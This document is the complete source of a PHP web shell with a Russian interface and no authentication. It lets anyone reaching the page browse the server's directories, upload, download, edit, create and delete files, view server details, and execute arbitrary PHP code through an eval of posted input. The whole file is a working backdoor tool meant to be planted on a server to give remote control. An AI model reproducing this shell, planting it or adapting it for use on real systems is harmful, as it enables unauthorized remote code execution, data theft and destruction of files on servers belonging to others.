<?php
	if (empty($_COOKIE["dir"])) {
		SetCookie("dir", realpath(".\\")."\\");
		header("Location: ./");
	}
	if (isset($_GET["goto"])) {
		$newdir=$_COOKIE["dir"].$_GET['goto'];
		SetCookie("dir", str_replace("\\\\", "\\", realpath($newdir)."\\"));
		header("Location: ".$_SERVER['PHP_SELF']);
	}
	if (isset($_GET["download"])) {
		header ("Content-Type: application/octet-stream");
		header ("Content-Length: ".filesize($_COOKIE["dir"].$_GET["download"]));
		header ("Content-Disposition: attachment; filename=".$_GET["download"]);
		readfile($_COOKIE["dir"].$_GET["download"]);
		die();
	}
	if (isset($_GET["rmdir"])) {
		if(!empty($_GET["unlink"])) {
			if(is_dir($_COOKIE["dir"].$_GET["rmdir"])) {
				rmdir($_COOKIE["dir"].$_GET["rmdir"]);
			}
		}
		header("Location: ".$_SERVER['PHP_SELF']);
	}
	if (isset($_GET["unlink"])) {
		if(!empty($_GET["unlink"])) {
			if(is_file($_COOKIE["dir"].$_GET["unlink"])) {
				unlink($_COOKIE["dir"].$_GET["unlink"]);
			}
		}
		header("Location: ".$_SERVER['PHP_SELF']);
	}
	if (isset($_GET["mkdir"])) {
		if(!empty($_GET["mkdir"])) {
			if(!is_dir($_COOKIE["dir"].$_GET["mkdir"])) {
				mkdir($_COOKIE["dir"].$_GET["mkdir"]);
			}
		}
		header("Location: ".$_SERVER['PHP_SELF']);
	}
	if (isset($_GET["mkfile"])) {
		if(!empty($_GET["mkfile"])) {
			if(!is_file($_COOKIE["dir"].$_GET["mkfile"])) {
				file_put_contents($_COOKIE["dir"].$_GET["mkfile"], "");
			}
		}
		header("Location: ".$_SERVER['PHP_SELF']);
	}
	if(isset($_POST["upload"])){
		if ($_FILES['file']['error'] == 0) {
			$_POST['filename'] = trim($_POST['filename']);
			if (empty($_POST['filename']))
				$_POST['filename'] = $_FILES['file']['name'];
			if (!copy($_FILES['file']['tmp_name'],$_COOKIE['dir'].'/'.$_POST['filename'])) {
				if (!move_uploaded_file($_FILES['file']['tmp_name'],$_COOKIE['dir'].'/'.$_POST['filename'])) {
					
				}
			}
		}
		header("Location: ".$_SERVER['PHP_SELF']);
	}
?>
<html>
	<head>
		<title>Shell</title>
		<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
		<style content="text/css">
			table {
				border-collapse:collapse;
			}
			table, th, td {
				border: 1px solid lime;
			}
			table, th, td {
				padding: 5px;
			}
			html {
				background-color: black;
				color: lime;
			}
			textarea {
				background-color: black;
				border: solid lime 2px;
				color: lime;
			}
			textarea:focus {
				border: dashed lime 1px;
				background-color: #001100;
			}
			textarea:hover {
				border: dashed lime 1px;
				background-color: #002200;
			}
			input {
				border: 1px solid lime;
				background-color: transparent;
				color: lime;
			}
			input:hover {
				border: 1px dashed lime;
				background-color: #002200;
			}
			input:focus {
				background-color: #001100;
			}
			a {
				color: lime;
			}
			a:hover {
				color: #00ff00 !important;
			}
			div {
				width:100%-5px;
				background-color:black;
				border:1px solid lime;
				padding:5px;
			}
		</style>
	</head>
	<body>
		<?if(isset($_POST['exec'])) {
			echo("<div style=\"margin-top:-1px;\">Результат:<hr>\n");
			eval(stripslashes($_POST['query']));
			echo("\n\t\t<br></div>\n");
		}?>
		<?if(isset($_GET['editfile']) && isset($_POST['edit']) && is_file($_COOKIE["dir"].$_GET['editfile'])) {
			if(file_put_contents($_COOKIE["dir"].$_GET['editfile'], $_POST['content'])) {
				echo("<div style=\"margin-top:-1px;font-size:30px;text-align:center;\">Файл успешно отредактирован!\n\t\t<br></div>\n");
			}
		}?>
		<div style="margin-top:-1px;">
			<b>Твой IP:</b> <?php echo(getenv('REMOTE_ADDR')); ?><br>
			<b>IP сервера:</b> <?php echo(getenv('SERVER_ADDR')); ?><br>
			<b>UA:</b> <?php echo(getenv('HTTP_USER_AGENT')); ?><br>
			<b>Дата:</b> <?php echo(date("j.n.Y")); ?><br>
			<b>Время:</b> <?php echo(date("H:i:s")); ?><br>
			<b>ПО сервера: </b> <?php echo(getenv('SERVER_SOFTWARE')); ?><br>
			<b>OS:</b> <?php echo(php_uname()); ?><br>
			<b>Версия PHP:</b> <?php echo(phpversion()); ?>
		</div>
		<div style="text-align:center;margin-top:-1px;">
			<a href="./">Главная</a> | <a href="?page=php">Выполнить PHP</a>
		</div>
<?if(empty($_GET)) {?>
		<table border="0" style="width:100%;margin-top:-2px;">
			<tr>
				<td style="width:1em;background-color:black;" colspan="4"><b>Вы сейчас тут:</b> <?echo($_COOKIE["dir"]);?></td>
			</tr>
			<tr>
				<td><i>№</i></td><td style="width:100%;"><i>Папка/файл</i></td><td><i>Размер</i></td><td><i>Действие</i></td>
			</tr>
<?php
	$i=1;
	if ($handle = opendir($_COOKIE["dir"])) {
		while (false !== ($folder = readdir($handle))) { 
			if ((@is_dir($_COOKIE["dir"].$folder) && ($folder != "."))) {
				$folderpath = $_COOKIE["dir"].$folder;
				echo "\t\t\t<tr>\n\t\t\t\t<td>$i</td><td><b><i><a href=\"?goto=$folder\\\">$folder</a></i></b></td><td></td><td><a href=\"?rmdir=$folder\">Удалить</td>\n\t\t\t</tr>\n";
				$i++;
			}
		}
		closedir($handle); 
	}else{
		SetCookie("dir", realpath(".\\")."\\");
		header("Location: ./");
	}
	if ($handle = opendir($_COOKIE["dir"])) {
		while (false !== ($file = readdir($handle))) { 
			if (@is_file($_COOKIE["dir"]."/".$file)) {
				$filepath = $_COOKIE["dir"]."/".$file;
				echo "\t\t\t<tr>\n\t\t\t\t<td>$i</td><td><a href=\"?download=$file\">$file</a></td><td>".round(filesize($filepath)/1024,2)." кб</td><td><a href=\"?unlink=$file\">Удалить</a> | <a href=\"?editfile=$file\">Редактировать</a></td>\n\t\t\t</tr>\n";
				$i++;
			}
		}
		closedir($handle); 
	}
?>
		</table>
		<div style="margin-top:-3px;">
			<form method="post" action="<?echo $_SERVER['PHP_SELF']?>" enctype="multipart/form-data">
				Загрузить файл: <input type="file" name="file"> с именем <input name="filename"><input type="submit" name="upload" value="Загрузить!">
			</form>
			<form method="get" action="<?echo $_SERVER['PHP_SELF']?>">
				Создать папку: <input name="mkdir"><input type="submit" value="Создать!">
			</form>
			<form method="get" action="<?echo $_SERVER['PHP_SELF']?>">
				Создать файл: <input name="mkfile"><input type="submit" value="Создать!">
			</form>
		</div>
<?}elseif(isset($_GET['page']) && $_GET['page']=='php') {?>
		<div style="margin-top:-2px;">
			<form method="post" action="?page=php">
				<textarea style="width:100%;height:200px;font-size:20px;" name="query"><?if(isset($_POST['exec']))echo($_POST['query']);?></textarea>
				<br><br>
				<input type="submit" name="exec" value="Выполнить!" style="width:100%;height:40px;font-size:30px;">
			</form>
		</div>
<?}elseif((isset($_GET['editfile']))){
	if(is_file($_COOKIE["dir"].$_GET['editfile'])){?>
		<div style="margin-top:-2px;">
		Файл: <?echo($_COOKIE["dir"].$_GET['editfile']);?>
		</div>
		<div style="margin-top:-2px;">
			<form method="post" action="?editfile=<?echo($_GET['editfile']);?>">
				<textarea style="width:100%;height:200px;font-size:20px;" name="content"><?echo(file_get_contents($_COOKIE["dir"].$_GET['editfile']));?></textarea>
				<br><br>
				<input type="submit" name="edit" value="Отредактировать!" style="width:100%;height:40px;font-size:30px;">
			</form>
		</div>
<?}else{?>
		<div style="margin-top:-2px;font-size:30px;text-align:center;">
			<b>Такого файла нет!</b>
		</div>
<?}}?>
	</body>
</html>